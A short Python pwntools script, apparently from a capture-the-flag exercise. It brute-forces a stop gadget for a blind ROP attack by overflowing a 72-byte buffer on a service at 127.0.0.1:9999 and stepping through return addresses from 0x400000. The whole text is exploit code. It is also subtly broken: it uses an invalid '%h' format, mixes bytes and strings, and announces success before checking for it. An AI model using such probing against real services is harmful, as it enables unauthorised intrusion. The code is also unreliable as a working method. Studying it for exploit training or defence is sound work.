from pwn import *
padding = 72
def find_stopgad():
    i=1
    base_addr = 0x400000
    while 1:
        try:
            io = remote('127.0.0.1',9999)
            io.recvline()
            payload = b'a'*padding+p64(base_addr)
            io.sendline(payload)
            oupu = io.recvuntil('password?\n')
            print('The stop_gadget is %h'%hex(base_addr))
            io.close()
            if not oupu.startswith('Welcome'):
                base_addr += 1
                print(hex(base_addr))
                io.close()
            else:
                return base_addr
        except EOFError:
            base_addr += 1
            print(hex(base_addr))
            io.close()
find_stopgad()

